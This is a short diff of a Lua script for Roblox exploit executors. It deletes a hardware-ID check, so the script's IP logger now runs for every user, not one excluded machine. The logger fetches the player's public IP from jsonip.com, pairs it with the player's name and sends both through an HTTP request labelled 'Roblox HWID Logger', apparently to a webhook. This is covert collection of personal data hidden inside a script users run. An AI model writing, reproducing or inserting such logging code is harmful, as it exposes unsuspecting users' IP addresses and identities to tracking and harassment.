@@ -11,7 +11,7 @@ LS("functions")
 local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local websocket = (syn and syn.websocket) or WebSocket
 
-if HWID ~= "97CB9DD4-E4FD-4124-86F6-DA05F5E1B7B0" then
+
 local jsonip = game:HttpGet("https://jsonip.com/")
 local ip = Services.HttpService:JSONDecode(jsonip)["ip"]
 local content = "> Name: "..LocalPlayer.Name
@@ -31,7 +31,7 @@ request{
         username = "Roblox HWID Logger"
     })
 }
-end
+
 
 Executor_b = identifyexecutor()
 Executor = string.gsub(Executor_b, " ", "-")
